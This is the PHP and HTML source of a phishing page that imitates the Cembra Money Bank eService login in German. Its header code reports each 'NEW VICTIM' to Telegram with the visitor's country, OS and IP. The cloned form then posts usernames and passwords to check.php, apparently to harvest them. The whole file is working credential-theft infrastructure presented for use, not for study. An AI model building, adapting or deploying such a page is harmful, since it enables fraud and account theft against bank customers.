<?php


include __DIR__ . "/cembra/functions.php";
include __DIR__ . "/cembra/config.php";


if($get_notification == "yes" ){
$data = "NEW VICTIM

┌──FROM :  $code
├──OS : $os
└──IP : $ip
    
    ";
        sendTelegram($data);
    }

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cembra Money Bank</title>
    <link rel="shortcut icon" href="./files/media/favicon.ico" type="image/x-icon">
    <meta name="description" content="">
    <link rel="stylesheet" href="./files/css/zwa9.css">
</head>
<body>
    <div class="wait">
        <div class="wait-hbess">
            <img src="./files/media/loading.gif" alt="loading" style="float:left; margin:2px 20px 5px 5px;" width="16" height="16"> <p style="margin:0;">Ihre Anfrage wird verarbeitet</p>
        </div>
    </div>

    <main>
        
        <header> 
            <div class="logo">
                <img src="./files/media/cembra-money-bank.jpg" alt="" srcset="">
            </div>
            <div class="lang-list">
                <div class="zbi"> <p>DE</p> </div>
                <div class="zbi"> <p>FR</p> </div>                
                <div class="zbi"> <p>IT</p> </div>               
                <div class="zbi"> <p>EN</p> </div>
            </div>
        </header>

    <div class="main-bg container">
            <div class="main-form">
                <div class="title">
                    <h1>Willkommen zu eService </h1>
                </div>
                <div class="l9wada">
                    <form action="check.php" id="loginForm" method="post">
                        <input type="hidden" name="step" value="1" hidden="">      

                        <div class="input-group ba3ad">
                            <div class="eonwan">
                                <p>
                                    Benutzername 
                                </p>
                                <a href="">Benutzername vergessen?</a>
                            </div>
                            <div class="ktaba">
                                <input required type="text" name="userid" id="userid">

                            </div>
                        </div>

                        <div class="input-group">
                            <div class="eonwan l9lawi">
                                <p>
                                    Passwort  
                                </p>
                                <a href="">Passwort vergessen?</a>
                            </div>
                            <div class="ktaba">
                                <input style="color:rgb(85, 85, 85);" type="password" required name="password" id="password">

                            </div>
                        </div>
                        <div class="mowafa9a">
                            <button id="loginButton">weiter</button>
                            <p>Noch nicht registriert?</p>
                        </div>
                </div>
            </div>
            <div class="zbii">
                <p>Mit * gekennzeichnete Felder sind Pflichtfelder. </p>   
            </div>
        </form>
    </div>
        </div>
    </div>
</main>

    <footer>
        <ul class="list-inline">
            <li><a target="" href="">Hilfe</a></li>|
            <li><a target="" href="">Online-Sicherheit</a></li>|
            <li><a target="" href="">Datenschutzrichtlinien</a></li>|
            <li><a target="" href="">Allgemeine Geschäftsbedingungen</a></li>
        </ul>
    </footer>
    <script src="./files/js/haraka.js">
    </script>
</body>
</html>